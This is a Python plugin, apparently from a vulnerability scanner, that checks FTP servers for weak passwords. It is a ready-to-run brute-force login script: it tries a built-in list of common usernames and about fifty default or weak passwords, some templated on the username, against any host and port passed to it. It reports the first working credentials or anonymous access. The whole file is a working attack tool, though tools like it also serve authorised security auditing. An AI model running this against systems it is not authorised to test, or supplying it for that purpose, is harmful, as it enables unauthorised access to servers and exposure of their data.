#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import ftplib
import re

def get_plugin_info():
    plugin_info = {
        "name": "FTP 弱口令",
        "desc": "导致敏感信息泄露，严重情况可导致服务器被入侵控制。",
        "grade": "高",
        "type": "service",
        "keyword": "service:ftp port:21",
    }
    return plugin_info
    
def poc(arg):
    check_port = lambda x:x if re.match(r"(.*?):(\d+)$",x) else x+':21'
    host,port = check_port(arg).split(':')
    timeout = 5
    user_list = ['ftp','www','admin','root','db','wwwroot','data','web','test']
    passwd_list = ['ftp',"123456","admin","root","password","123123","123","1",
        "{user}","{user}{user}","{user}1","{user}123","{user}2016","{user}2015",
        "{user}!","","password01!","root@dba","P@ssw0rd!!","qwa123","root#123",
        "12345678","test","123qwe!@#","123456789","123321","1314520","666666",
        "woaini","fuckyou","000000","1234567890","8888888","qwerty","1qaz2wsx",
        "abc123","abc123456","1q2w3e4r","123qwe","159357","p@ssw0rd","p@55w0rd",
        "password!","p@ssw0rd!","password1","123qwe!@#","123QWE!@#","!@#qwe123",
        "123qwe!@#$","1qaz@WSX","r00t","tomcat","apache","system"]
    error_i = 0
    for user in user_list:
        for pass_ in passwd_list:
            passwd = pass_.replace('{user}', user)
            try:
                ftp = ftplib.FTP()
                ftp.timeout = timeout
                ftp.connect(host, int(port))
                ftp.login(user, passwd)
                ftp.close()
                if passwd == '': passwd = "null"
                if user == 'ftp' and passwd == 'ftp': return f'{arg}\tanonymous'
                return f'{arg}\t{user}/{passwd}'
            except Exception as e:
                if "Errno 10061" in str(e) or "WinError 10061" in str(e) or "timed out" in str(e): error_i += 1
            if error_i >= 3: return

if __name__ == '__main__':
    import sys
    if len(sys.argv) != 2:
        print("{} IP[:port]".format(sys.argv[0]))
    else:
        print("{} {}".format(sys.argv[1],poc(sys.argv[1])))  

    
